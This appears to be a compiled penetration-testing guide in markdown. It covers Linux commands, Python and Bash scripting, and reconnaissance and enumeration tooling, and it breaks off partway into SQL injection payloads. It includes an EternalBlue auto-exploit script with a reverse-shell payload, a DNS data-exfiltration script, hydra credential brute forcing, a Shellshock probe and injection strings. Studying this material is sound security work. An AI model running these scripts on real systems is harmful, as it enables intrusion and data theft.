# The Ultimate Cybersecurity Master Guide
## Complete Professional Resource Compilation

*Compiled from 13+ professional cybersecurity books including:*
- Metasploit: The Penetration Tester's Guide (2nd Edition)
- Penetration Testing by Georgia Weidman  
- Black Hat Bash
- Gray Hat Python
- Automate the Boring Stuff with Python (3rd Edition)
- Cybersecurity for Small Networks
- Microcontroller Exploits
- Go H*ck Yourself
- Steal This Computer Book 4.0
- PoC||GTFO series
- And more...

---

## MASTER TABLE OF CONTENTS

### PART I: FOUNDATIONS
1. [Core Cybersecurity Concepts](#core-cybersecurity-concepts)
2. [Linux Command Line Mastery](#linux-command-line-mastery)
3. [Python for Security Professionals](#python-for-security-professionals)
4. [Bash Scripting for Red Teams](#bash-scripting-for-red-teams)

### PART II: RECONNAISSANCE & ENUMERATION
5. [Information Gathering Techniques](#information-gathering-techniques)
6. [Network Scanning & Discovery](#network-scanning--discovery)
7. [Service Enumeration](#service-enumeration)
8. [Web Application Reconnaissance](#web-application-reconnaissance)

### PART III: VULNERABILITY ASSESSMENT
9. [Automated Vulnerability Scanning](#automated-vulnerability-scanning)
10. [Manual Testing Methodologies](#manual-testing-methodologies)
11. [Web Application Vulnerabilities](#web-application-vulnerabilities)
12. [Network Service Vulnerabilities](#network-service-vulnerabilities)

### PART IV: EXPLOITATION
13. [Metasploit Framework Mastery](#metasploit-framework-mastery)
14. [Buffer Overflow Exploitation](#buffer-overflow-exploitation)
15. [Web Exploitation Techniques](#web-exploitation-techniques)
16. [Password Attacks](#password-attacks)
17. [Client-Side Exploitation](#client-side-exploitation)

### PART V: POST-EXPLOITATION
18. [Privilege Escalation](#privilege-escalation)
19. [Lateral Movement](#lateral-movement)
20. [Persistence Mechanisms](#persistence-mechanisms)
21. [Data Exfiltration](#data-exfiltration)
22. [Covering Tracks](#covering-tracks)

### PART VI: ADVANCED TOPICS
23. [Active Directory Attacks](#active-directory-attacks)
24. [Cloud Security & Exploitation](#cloud-security--exploitation)
25. [Mobile Device Security](#mobile-device-security)
26. [IoT & Hardware Hacking](#iot--hardware-hacking)
27. [Wireless Network Security](#wireless-network-security)

### PART VII: DEFENSIVE SECURITY
28. [Network Security Architecture](#network-security-architecture)
29. [Firewall Configuration](#firewall-configuration)
30. [Intrusion Detection Systems](#intrusion-detection-systems)
31. [Security Monitoring & SIEM](#security-monitoring--siem)
32. [Incident Response](#incident-response)

### PART VIII: SPECIALIZED SKILLS
33. [Malware Analysis](#malware-analysis)
34. [Digital Forensics](#digital-forensics)
35. [Reverse Engineering](#reverse-engineering)
36. [Social Engineering](#social-engineering)

### PART IX: AUTOMATION & TOOLING
37. [Python Automation Scripts](#python-automation-scripts)
38. [Custom Tool Development](#custom-tool-development)
39. [CI/CD for Security](#cicd-for-security)

### PART X: PROFESSIONAL PRACTICE
40. [Penetration Testing Methodology](#penetration-testing-methodology)
41. [Report Writing](#report-writing)
42. [Legal & Ethical Considerations](#legal--ethical-considerations)

---

# PART I: FOUNDATIONS

## Core Cybersecurity Concepts

### CIA Triad
**Confidentiality** - Data accessible only to authorized parties
**Integrity** - Data remains unaltered and trustworthy
**Availability** - Systems and data accessible when needed

### Defense in Depth
Multiple layers of security controls:
1. Physical security
2. Network security
3. Host security
4. Application security
5. Data security

### Attack Lifecycle (Cyber Kill Chain)
1. **Reconnaissance** - Information gathering
2. **Weaponization** - Creating exploit payload
3. **Delivery** - Transmitting weapon to target
4. **Exploitation** - Executing code on victim system
5. **Installation** - Installing malware/backdoor
6. **Command & Control** - Remote control channel
7. **Actions on Objectives** - Achieving attacker's goals

---

## Linux Command Line Mastery

### Essential Linux Commands for Security

#### File System Navigation
```bash
# Navigation
pwd                    # Print working directory
ls -la                 # List all files with details
cd /path/to/dir       # Change directory
find / -name file.txt # Find files
locate filename       # Fast file location
which command         # Find command location
whereis command       # Find command, source, man pages

# File Operations
cat file.txt          # Display file contents
less file.txt         # Page through file
head -n 20 file.txt   # First 20 lines
tail -n 20 file.txt   # Last 20 lines
tail -f /var/log/auth.log  # Follow log file in real-time
grep "pattern" file   # Search for pattern
awk '{print $1}' file # Process columns
sed 's/old/new/g' file  # Stream editor
cut -d: -f1 /etc/passwd  # Extract fields

# File Permissions
chmod 755 file        # Change permissions (rwxr-xr-x)
chmod +x script.sh    # Make executable
chown user:group file # Change ownership
umask 022             # Set default permissions

# Archiving & Compression
tar -czf archive.tar.gz directory/  # Create compressed archive
tar -xzf archive.tar.gz             # Extract archive
zip -r archive.zip directory/       # Create zip
unzip archive.zip                   # Extract zip
gzip file.txt                       # Compress file
gunzip file.txt.gz                  # Decompress file
```

#### Process Management
```bash
# Process Viewing
ps aux                # All running processes
ps aux | grep nginx   # Find specific process
top                   # Interactive process viewer
htop                  # Better process viewer
pstree                # Process tree

# Process Control
kill PID              # Terminate process
kill -9 PID           # Force kill
killall process_name  # Kill by name
pkill -f pattern      # Kill by pattern

# Background/Foreground
command &             # Run in background
jobs                  # List background jobs
fg %1                 # Bring job 1 to foreground
bg %1                 # Send job 1 to background
nohup command &       # Run immune to hangups
```

#### Network Commands
```bash
# Network Information
ip addr show          # Show IP addresses
ip route show         # Show routing table
ifconfig              # Network interfaces (legacy)
netstat -tulpn        # Listening ports
ss -tulpn             # Socket statistics (modern)
lsof -i :80           # What's using port 80

# Network Testing
ping -c 4 host        # Ping 4 times
traceroute host       # Trace route to host
mtr host              # Combined ping/traceroute
nc -zv host 1-1000    # Port scan with netcat
curl -I https://site.com  # HTTP headers
wget https://site.com/file  # Download file

# Network Capture
tcpdump -i eth0       # Capture on interface
tcpdump -i eth0 -w capture.pcap  # Save to file
tcpdump -r capture.pcap  # Read from file
tcpdump port 80       # Capture port 80
tcpdump host 192.168.1.100  # Capture specific host
```

#### User & Permission Management
```bash
# User Information
whoami                # Current user
id                    # User ID and groups
w                     # Logged in users
last                  # Login history
lastlog               # Last login per user

# User Management
useradd username      # Create user
userdel username      # Delete user
passwd username       # Change password
usermod -aG group user  # Add user to group
su - username         # Switch user
sudo command          # Execute as root

# Permission Discovery
sudo -l               # Check sudo privileges
find / -perm -4000 2>/dev/null  # Find SUID binaries
find / -writable -type d 2>/dev/null  # Writable directories
getcap -r / 2>/dev/null  # Find capabilities
```

### Advanced Linux for Security

#### Process & System Analysis
```bash
# System Information
uname -a              # Kernel info
cat /etc/*-release    # OS version
lsb_release -a        # Distribution info
hostname              # System name
uptime                # System uptime
dmesg                 # Kernel messages

# Hardware Information
lscpu                 # CPU information
lspci                 # PCI devices
lsusb                 # USB devices
lsblk                 # Block devices
df -h                 # Disk space
free -h               # Memory usage

# Service Management (systemd)
systemctl status service  # Check service status
systemctl start service   # Start service
systemctl stop service    # Stop service
systemctl enable service  # Enable at boot
systemctl list-units --type=service  # List services
journalctl -u service     # Service logs
```

#### Log Analysis
```bash
# Common Log Locations
/var/log/auth.log         # Authentication logs
/var/log/syslog           # System logs
/var/log/apache2/         # Apache logs
/var/log/nginx/           # Nginx logs
/var/log/mysql/           # MySQL logs

# Log Analysis Commands
# Failed SSH logins
grep "Failed password" /var/log/auth.log

# Successful SSH logins
grep "Accepted" /var/log/auth.log

# Top attacking IPs
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -10

# Find suspicious sudo usage
grep "sudo" /var/log/auth.log | grep -v "session opened"

# Monitor log in real-time
tail -f /var/log/syslog | grep --line-buffered "ERROR"
```

---

## Python for Security Professionals

### Python Basics for Security

#### Essential Python Constructs
```python
#!/usr/bin/env python3

# Variables and Data Types
ip_address = "192.168.1.1"
port = 80
is_vulnerable = True
services = ["ssh", "http", "mysql"]
host_info = {"ip": "192.168.1.1", "os": "Linux"}

# String Operations
banner = "HTTP/1.1 200 OK"
if "HTTP" in banner:
    print("Web server detected")

# String formatting
print(f"Scanning {ip_address}:{port}")
print("Host: {} Port: {}".format(ip_address, port))

# Lists and Iteration
for service in services:
    print(f"Checking {service}")

# Dictionaries
for key, value in host_info.items():
    print(f"{key}: {value}")

# List Comprehension
open_ports = [p for p in range(1, 1001) if check_port(p)]
```

#### File Operations
```python
# Reading files
with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

# Writing files
with open('results.txt', 'w') as f:
    f.write("Scan results:\n")
    for result in results:
        f.write(f"{result}\n")

# Appending to files
with open('log.txt', 'a') as f:
    f.write(f"[{timestamp}] Event logged\n")

# Binary file operations
with open('payload.bin', 'rb') as f:
    data = f.read()

# JSON files
import json
with open('config.json', 'r') as f:
    config = json.load(f)

with open('output.json', 'w') as f:
    json.dump(data, f, indent=4)
```

### Network Programming

#### Socket Programming
```python
import socket

# TCP Client
def tcp_client(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    
    # Send data
    client.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
    
    # Receive response
    response = client.recv(4096)
    print(response.decode())
    
    client.close()

# TCP Server
def tcp_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] Listening on port {port}")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connection from {addr[0]}:{addr[1]}")
        
        data = client.recv(1024)
        print(f"[*] Received: {data.decode()}")
        
        client.send(b"Message received")
        client.close()

# UDP Client
def udp_client(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(b"Test message", (host, port))
    response, addr = client.recvfrom(4096)
    print(f"[*] Response: {response.decode()}")

# Port Scanner
def port_scanner(target, ports):
    print(f"Scanning {target}")
    open_ports = []
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        
        sock.close()
    
    return open_ports

# Usage
target = "192.168.1.100"
ports = range(1, 1001)
open_ports = port_scanner(target, ports)
```

#### HTTP Requests
```python
import requests

# GET request
response = requests.get('https://example.com')
print(f"Status: {response.status_code}")
print(f"Headers: {response.headers}")
print(f"Body: {response.text}")

# POST request
data = {'username': 'admin', 'password': 'password'}
response = requests.post('https://example.com/login', data=data)

# Custom headers
headers = {'User-Agent': 'CustomBot/1.0'}
response = requests.get('https://example.com', headers=headers)

# Authentication
response = requests.get('https://example.com', auth=('user', 'pass'))

# Proxies
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
response = requests.get('https://example.com', proxies=proxies, verify=False)

# Session handling
session = requests.Session()
session.get('https://example.com/login')
response = session.post('https://example.com/dashboard')
```

### Web Scraping for OSINT
```python
from bs4 import BeautifulSoup
import requests

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract all links
    links = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            links.append(href)
    
    # Extract emails
    import re
    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', response.text)
    
    # Extract specific elements
    titles = soup.find_all('h1')
    for title in titles:
        print(title.text)
    
    return links, emails

# Extract form data
def get_form_details(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    forms = soup.find_all("form")
    
    for form in forms:
        details = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        
        print(f"Form: {details}")
```

### Process Automation
```python
import subprocess
import os

# Execute system commands
def run_command(command):
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout, result.stderr

# Execute Nmap
output, error = run_command("nmap -sV 192.168.1.100")
print(output)

# Run multiple commands
def run_scan_suite(target):
    commands = [
        f"nmap -sV {target}",
        f"nikto -h {target}",
        f"dirb http://{target}"
    ]
    
    for cmd in commands:
        print(f"[*] Running: {cmd}")
        output, error = run_command(cmd)
        
        # Save output
        with open(f'{target}_scan.txt', 'a') as f:
            f.write(f"=== {cmd} ===\n")
            f.write(output)
            f.write("\n\n")

# File operations automation
def organize_wordlists():
    wordlist_dir = "/usr/share/wordlists"
    
    for root, dirs, files in os.walk(wordlist_dir):
        for file in files:
            if file.endswith('.txt'):
                full_path = os.path.join(root, file)
                size = os.path.getsize(full_path)
                print(f"{file}: {size} bytes")
```

---

## Bash Scripting for Red Teams

### Bash Script Fundamentals

#### Variables and Input
```bash
#!/bin/bash

# Variables
TARGET="192.168.1.100"
PORT=80
SCAN_TYPE="SYN"

# Command substitution
CURRENT_DATE=$(date +%Y-%m-%d)
IP_ADDRESS=$(hostname -I | awk '{print $1}')

# User input
read -p "Enter target IP: " target
read -sp "Enter password: " password  # Silent input
echo

# Command line arguments
TARGET=$1
PORT=$2

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target> <port>"
    exit 1
fi
```

#### Conditionals and Loops
```bash
# If statements
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

if [ "$USER" == "root" ]; then
    echo "Running as root"
else
    echo "Not root"
fi

# Numeric comparison
if [ $PORT -gt 1024 ]; then
    echo "High port"
fi

# For loops
for port in {1..100}; do
    echo "Scanning port $port"
done

for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 $ip > /dev/null 2>&1 && echo "$ip is up"
done

# While loops
while read line; do
    echo "Processing: $line"
done < wordlist.txt

# Until loops
counter=0
until [ $counter -gt 10 ]; do
    echo "Counter: $counter"
    ((counter++))
done
```

#### Functions
```bash
# Function definition
check_port() {
    local host=$1
    local port=$2
    
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Port $port is open"
        return 0
    else
        return 1
    fi
}

# Function with return value
scan_host() {
    local target=$1
    local open_ports=()
    
    for port in {1..1000}; do
        if check_port $target $port; then
            open_ports+=($port)
        fi
    done
    
    echo "${open_ports[@]}"
}

# Usage
TARGET="192.168.1.100"
RESULTS=$(scan_host $TARGET)
echo "Open ports: $RESULTS"
```

### Offensive Bash Scripts

#### Network Reconnaissance
```bash
#!/bin/bash
# network_recon.sh - Comprehensive network reconnaissance

TARGET_NETWORK="192.168.1.0/24"
OUTPUT_DIR="recon_results"

# Create output directory
mkdir -p $OUTPUT_DIR

echo "[*] Starting network reconnaissance"
echo "[*] Target: $TARGET_NETWORK"

# Host discovery
echo "[*] Discovering live hosts..."
nmap -sn $TARGET_NETWORK -oG - | grep "Up" | cut -d' ' -f2 > $OUTPUT_DIR/live_hosts.txt

# Port scanning
echo "[*] Scanning ports on live hosts..."
while read host; do
    echo "[*] Scanning $host"
    nmap -sV -O $host -oN $OUTPUT_DIR/${host}_scan.txt &
done < $OUTPUT_DIR/live_hosts.txt

wait

# Service enumeration
echo "[*] Enumerating services..."
for scan_file in $OUTPUT_DIR/*_scan.txt; do
    host=$(basename $scan_file _scan.txt)
    
    # Check for SMB
    if grep -q "445/tcp" $scan_file; then
        echo "[*] SMB found on $host"
        enum4linux -a $host > $OUTPUT_DIR/${host}_smb.txt 2>&1
    fi
    
    # Check for HTTP
    if grep -q "80/tcp\|8080/tcp" $scan_file; then
        echo "[*] Web service found on $host"
        nikto -h http://$host > $OUTPUT_DIR/${host}_nikto.txt 2>&1
    fi
done

echo "[+] Reconnaissance complete! Results in $OUTPUT_DIR/"
```

#### Automated Exploitation Framework
```bash
#!/bin/bash
# auto_exploit.sh - Automated exploitation script

TARGET=$1
LHOST=$(hostname -I | awk '{print $1}')
LPORT=4444

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

# Check for common vulnerabilities
echo "[*] Checking for vulnerabilities on $TARGET"

# MS17-010 (EternalBlue) check
echo "[*] Checking for MS17-010..."
nmap -p 445 --script smb-vuln-ms17-010 $TARGET | grep -q "VULNERABLE"
if [ $? -eq 0 ]; then
    echo "[+] MS17-010 detected! Attempting exploitation..."
    
    # Create Metasploit resource script
    cat << EOF > /tmp/exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j
EOF
    
    msfconsole -r /tmp/exploit.rc
fi

# Check for shellshock
echo "[*] Checking for Shellshock..."
curl -A "() { :; }; echo vulnerable" "http://$TARGET/cgi-bin/test.sh" 2>/dev/null | grep -q "vulnerable"
if [ $? -eq 0 ]; then
    echo "[+] Shellshock vulnerability detected!"
fi

# Check for default credentials
echo "[*] Testing default credentials..."
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-credentials.csv \
    $TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" \
    -t 4 -w 10
```

#### Data Exfiltration via DNS
```bash
#!/bin/bash
# dns_exfil.sh - Exfiltrate data via DNS queries

FILE=$1
DOMAIN=$2  # Your controlled domain

if [ -z "$FILE" ] || [ -z "$DOMAIN" ]; then
    echo "Usage: $0 <file> <domain>"
    exit 1
fi

echo "[*] Exfiltrating $FILE via DNS"

# Encode file to base64 and split into chunks
base64 $FILE | fold -w 32 | while read chunk; do
    # Send DNS query
    nslookup "$chunk.$DOMAIN" 8.8.8.8 > /dev/null 2>&1
    echo "[*] Sent chunk: ${chunk:0:10}..."
    sleep 0.5
done

echo "[+] Exfiltration complete"
```

### Defensive Bash Scripts

#### Log Monitoring
```bash
#!/bin/bash
# monitor_logs.sh - Real-time log monitoring and alerting

LOG_FILE="/var/log/auth.log"
ALERT_EMAIL="admin@example.com"
THRESHOLD=5  # Failed login attempts threshold

# Monitor failed SSH attempts
tail -f $LOG_FILE | while read line; do
    if echo "$line" | grep -q "Failed password"; then
        IP=$(echo "$line" | awk '{print $(NF-3)}')
        
        # Count failed attempts from this IP
        COUNT=$(grep "Failed password" $LOG_FILE | grep "$IP" | wc -l)
        
        if [ $COUNT -ge $THRESHOLD ]; then
            echo "[!] ALERT: $COUNT failed login attempts from $IP"
            
            # Block IP with iptables
            iptables -A INPUT -s $IP -j DROP
            
            # Send email alert
            echo "Blocked $IP after $COUNT failed login attempts" | \
                mail -s "Security Alert" $ALERT_EMAIL
        fi
    fi
done
```

---

# PART II: RECONNAISSANCE & ENUMERATION

## Information Gathering Techniques

### Passive Reconnaissance

#### OSINT (Open Source Intelligence)
```bash
# Domain enumeration
whois domain.com
nslookup domain.com
dig domain.com ANY
host -t mx domain.com  # Mail servers
host -t ns domain.com  # Name servers
host -t txt domain.com # TXT records

# Subdomain enumeration
# Using fierce
fierce --domain domain.com

# Using sublist3r
sublist3r -d domain.com

# DNS zone transfer
dig axfr @ns1.domain.com domain.com

# Reverse DNS lookup
dig -x 192.168.1.100

# Search engines
site:domain.com filetype:pdf
site:domain.com intitle:"index of"
site:domain.com inurl:admin
```

#### Google Dorking
```
# Find admin pages
site:target.com inurl:admin
site:target.com intitle:"admin panel"

# Find login pages
site:target.com inurl:login
site:target.com intext:"password"

# Find exposed files
site:target.com filetype:sql
site:target.com filetype:log
site:target.com filetype:conf
site:target.com filetype:env

# Find directory listings
site:target.com intitle:"index of"

# Find backup files
site:target.com ext:bak
site:target.com ext:old
site:target.com inurl:backup

# Find sensitive documents
site:target.com filetype:xlsx "confidential"
site:target.com filetype:docx "internal"

# Find subdomains
site:*.target.com

# Cached pages
cache:target.com
```

#### Social Media Intelligence
```bash
# LinkedIn reconnaissance
# - Company employees
# - Job postings (reveal tech stack)
# - Skills and certifications

# GitHub intelligence
# Search: "company-name password"
# Search: "company-name api_key"
# Look for: .env files, config files

# Twitter/X OSINT
# Employee tweets about infrastructure
# Company announcements
# Technology mentions

# Using theHarvester
theHarvester -d domain.com -l 500 -b google
theHarvester -d domain.com -b linkedin

# Using recon-ng
recon-ng
marketplace install all
workspaces create company
modules load recon/domains-hosts/google_site_web
options set SOURCE domain.com
run
```

#### Shodan & Censys
```bash
# Shodan searches
shodan search "org:Company Name"
shodan search "hostname:domain.com"
shodan search "port:22 country:US"
shodan search "product:Apache"

# Common Shodan queries
ssl.cert.subject.cn:domain.com
http.title:"Dashboard" country:US
port:23 country:US
"default password" port:80

# Using Shodan CLI
shodan init YOUR_API_KEY
shodan search "apache" --fields ip_str,port,org
shodan host 192.168.1.1

# Censys searches
# Via web interface censys.io
# Search for certificates, hosts, services
```

### Active Reconnaissance

#### Network Scanning with Nmap

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
nmap -PR 192.168.1.0/24

# Disable ping
nmap -Pn 192.168.1.100

# TCP SYN ping
nmap -PS22,80,443 192.168.1.0/24

# UDP ping
nmap -PU 192.168.1.0/24

# Using list of hosts
nmap -sn -iL hosts.txt
```

**Port Scanning**
```bash
# Quick scan (top 100 ports)
nmap --top-ports 100 192.168.1.100

# Scan all 65535 ports
nmap -p- 192.168.1.100

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.100

# TCP SYN scan (stealth)
nmap -sS 192.168.1.100

# TCP Connect scan
nmap -sT 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# Fast scan (aggressive timing)
nmap -T4 -F 192.168.1.100

# Version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Output to all formats
nmap -oA scan_results 192.168.1.100
```

**NSE Scripts**
```bash
# Run default scripts
nmap -sC 192.168.1.100

# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers 192.168.1.100

# Database enumeration
nmap --script mysql-enum 192.168.1.100

# Find specific scripts
ls /usr/share/nmap/scripts/ | grep http
nmap --script-help http-enum
```

## Service Enumeration

### SMB Enumeration (Port 445/139)

```bash
# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users,smb-enum-domains 192.168.1.100
nmap --script smb-os-discovery 192.168.1.100
nmap --script smb-security-mode 192.168.1.100
nmap --script smb-vuln* 192.168.1.100

# enum4linux
enum4linux -a 192.168.1.100
enum4linux -U 192.168.1.100  # Users
enum4linux -S 192.168.1.100  # Shares
enum4linux -G 192.168.1.100  # Groups
enum4linux -P 192.168.1.100  # Password policy

# smbclient
smbclient -L //192.168.1.100 -N  # List shares (null session)
smbclient //192.168.1.100/share -N  # Connect to share
smbclient //192.168.1.100/share -U username

# smbmap
smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -u username -p password
smbmap -H 192.168.1.100 -u username -p password -R  # Recursive listing

# CrackMapExec
crackmapexec smb 192.168.1.100
crackmapexec smb 192.168.1.0/24 -u '' -p ''  # Null session
crackmapexec smb 192.168.1.100 -u username -p password --shares
crackmapexec smb 192.168.1.100 -u username -p password --spider C$ --pattern txt
```

### SNMP Enumeration (Port 161)

```bash
# Nmap SNMP scripts
nmap -sU -p 161 --script snmp-* 192.168.1.100

# snmpwalk
snmpwalk -v 1 -c public 192.168.1.100
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.1  # System info
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.6.13.1.3  # Open TCP ports
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.25.6.3.1.2  # Installed software

# onesixtyone - SNMP scanner
onesixtyone -c community.txt 192.168.1.100

# snmp-check
snmp-check 192.168.1.100 -c public
```

### LDAP Enumeration (Port 389/636)

```bash
# Nmap LDAP scripts
nmap -p 389 --script ldap-search 192.168.1.100
nmap -p 389 --script ldap-rootdse 192.168.1.100

# ldapsearch
ldapsearch -x -h 192.168.1.100 -s base
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=com"
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=com" "(objectClass=user)"

# Anonymous bind
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=com" -D "" -w ""

# Authenticated
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=com" -D "cn=admin,dc=domain,dc=com" -w password

# Extract user information
ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```

### NFS Enumeration (Port 2049)

```bash
# Show mount points
showmount -e 192.168.1.100

# Nmap NFS scripts
nmap -p 111,2049 --script nfs-* 192.168.1.100

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs 192.168.1.100:/share /mnt/nfs

# List contents
ls -la /mnt/nfs
```

### FTP Enumeration (Port 21)

```bash
# Connect
ftp 192.168.1.100
# Try anonymous login: anonymous / anonymous

# Nmap FTP scripts
nmap --script ftp-anon 192.168.1.100
nmap --script ftp-bounce 192.168.1.100

# Download all files
wget -r ftp://anonymous:anonymous@192.168.1.100/
```

### SSH Enumeration (Port 22)

```bash
# Banner grabbing
nc 192.168.1.100 22
telnet 192.168.1.100 22

# Enumerate users (CVE-2018-15473)
python ssh_user_enum.py --port 22 --userList users.txt 192.168.1.100

# Nmap SSH scripts
nmap --script ssh-auth-methods 192.168.1.100
nmap --script ssh-hostkey 192.168.1.100
```

## Web Application Reconnaissance

### Directory & File Enumeration

```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
gobuster dir -u http://target.com -w wordlist.txt -s 200,301,302
gobuster dns -d target.com -w subdomains.txt

# Dirb
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt
dirb http://target.com wordlist.txt -X .php,.html

# Dirbuster (GUI)
# Point to target and wordlist

# ffuf
ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -t 50  # 50 threads

# wfuzz
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ
wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ

# feroxbuster (recursive)
feroxbuster -u http://target.com -w wordlist.txt
feroxbuster -u http://target.com -w wordlist.txt -x php,html -t 50
```

### Subdomain Enumeration

```bash
# Sublist3r
sublist3r -d target.com

# Amass
amass enum -d target.com
amass enum -d target.com -passive  # Passive only
amass enum -d target.com -brute -w subdomains.txt

# Assetfinder
assetfinder target.com
assetfinder --subs-only target.com

# Subfinder
subfinder -d target.com
subfinder -d target.com -silent

# Gobuster DNS mode
gobuster dns -d target.com -w subdomains.txt

# dnsrecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D subdomains.txt
```

### Web Technology Fingerprinting

```bash
# Whatweb
whatweb http://target.com
whatweb -v http://target.com  # Verbose
whatweb -a 3 http://target.com  # Aggressive

# Wappalyzer (browser extension)
# Identifies technologies used

# BuiltWith
# Online service at builtwith.com

# Nmap http-* scripts
nmap --script http-enum http://target.com
nmap --script http-headers http://target.com
nmap --script http-methods http://target.com

# Nikto
nikto -h http://target.com
nikto -h http://target.com -Tuning x  # All tests
```

### SSL/TLS Analysis

```bash
# sslscan
sslscan target.com:443

# testssl.sh
testssl.sh target.com

# Nmap SSL scripts
nmap --script ssl-cert target.com
nmap --script ssl-enum-ciphers target.com

# Check for Heartbleed
nmap --script ssl-heartbleed target.com

# Manual certificate check
openssl s_client -connect target.com:443
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text
```

---

# PART III: VULNERABILITY ASSESSMENT

## Automated Vulnerability Scanning

### Nessus

**Installation & Setup**
```bash
# Download from tenable.com
# Install
dpkg -i Nessus-*.deb
systemctl start nessusd

# Access via https://localhost:8834
# Create account and get activation code
```

**Scanning Workflow**
1. Create New Scan
2. Choose template (Basic Network Scan, Web Application Tests, etc.)
3. Configure targets
4. Set credentials (for authenticated scans)
5. Launch scan
6. Review results by severity

**Best Practices**
- Use authenticated scans when possible
- Schedule regular scans
- Compare scan results over time
- Export reports in multiple formats
- Integrate with ticketing systems

### OpenVAS

```bash
# Installation (Kali)
apt-get install openvas
gvm-setup
gvm-check-setup

# Start services
gvm-start

# Access via https://localhost:9392
# Default: admin / generated_password
```

### Nikto

```bash
# Basic scan
nikto -h http://target.com

# Scan with specific tests
nikto -h http://target.com -Tuning 1234

# Tuning options:
# 1 - Interesting files
# 2 - Misconfiguration
# 3 - Information disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote file retrieval
# 6 - Denial of service
# 7 - Remote file inclusion
# 8 - Command execution
# 9 - SQL injection
# a - Authentication bypass
# b - Software identification
# c - Remote source inclusion
# x - Reverse tuning (all except specified)

# Save output
nikto -h http://target.com -o results.html -Format html
nikto -h http://target.com -o results.xml -Format xml

# Scan multiple hosts
nikto -h hosts.txt

# Use proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Custom user agent
nikto -h http://target.com -useragent "Custom Bot"
```

### OWASP ZAP

```bash
# Installation
apt-get install zaproxy

# Launch
zaproxy

# Automated scan via CLI
zap.sh -cmd -quickurl http://target.com -quickout report.html

# Spider a site
zap.sh -cmd -quickurl http://target.com -spider

# Active scan
zap.sh -cmd -quickurl http://target.com -quickprogress
```

**ZAP Workflow**
1. Configure proxy (usually localhost:8080)
2. Set browser to use ZAP proxy
3. Spider the application
4. Passive scanning (automatic)
5. Active scanning (manual start)
6. Review alerts
7. Generate report

## Web Application Vulnerabilities

### 
### Manual Vulnerability Testing

#### SQL Injection Testing
```bash
# Basic test payloads
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
